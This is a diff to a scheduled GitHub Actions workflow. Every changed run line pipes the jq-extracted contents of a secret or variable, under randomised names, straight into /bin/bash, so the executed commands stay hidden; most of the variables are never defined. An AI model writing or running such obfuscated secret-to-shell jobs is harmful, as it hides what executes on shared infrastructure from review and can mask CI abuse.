@@ -3,7 +3,8 @@ name: weishenmeda
 on:
   workflow_dispatch:
   schedule:
-    - cron: '39 5/6 * * *'
+    - cron: '15 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,17 +12,21 @@ jobs:
       - uses: actions/checkout@v4
       - name: weishenmeda
         env:
-          qilgy31687: ${{ secrets.qilgy31687 }}
+          xu95: ${{ secrets.xu95 }}
         run: |
-          echo $qilgy31687 | jq -r .dw89 | /bin/bash
-          echo $ws06024 | jq -r .mjmq12 | /bin/bash
-          echo $del53275 | jq -r .cf0229 | /bin/bash
-          echo $knrct2 | jq -r .ohmld29 | /bin/bash
-          echo $ej5 | jq -r .dlbeq9388 | /bin/bash
-          echo $axjtr71 | jq -r .pvdh13122 | /bin/bash
-          echo $suz49626 | jq -r .xutx32342 | /bin/bash
-          echo $spvtu26753 | jq -r .zeetm1 | /bin/bash
-          echo $hiis3652 | jq -r .kjetl93 | /bin/bash
-          echo $no4928 | jq -r .yxvo8 | /bin/bash
-          echo $y485 | jq -r .laz053 | /bin/bash
+          echo $xu95 | jq -r .sz4 | /bin/bash
+          echo $h9 | jq -r .eu67287 | /bin/bash
+          echo $tzbl8381 | jq -r .htl01 | /bin/bash
+          echo $exu06 | jq -r .hombh2 | /bin/bash
+          echo $egvf44 | jq -r .wdios7321 | /bin/bash
+          echo $kpc53 | jq -r .pib85794 | /bin/bash
+          echo $n3352 | jq -r .adlqt27 | /bin/bash
+          echo $cu76 | jq -r .qjge76057 | /bin/bash
+          echo $lzw923 | jq -r .cny7 | /bin/bash
+          echo $psk3208 | jq -r .nli16388 | /bin/bash
+          echo $pnm26872 | jq -r .umymw1633 | /bin/bash
+          echo $j0 | jq -r .ngbx14 | /bin/bash
+          echo $xto3831 | jq -r .jzpg68 | /bin/bash
+          echo $s586 | jq -r .nkvnz30688 | /bin/bash
+          echo $zphr21640 | jq -r .jbzqu644 | /bin/bash
 
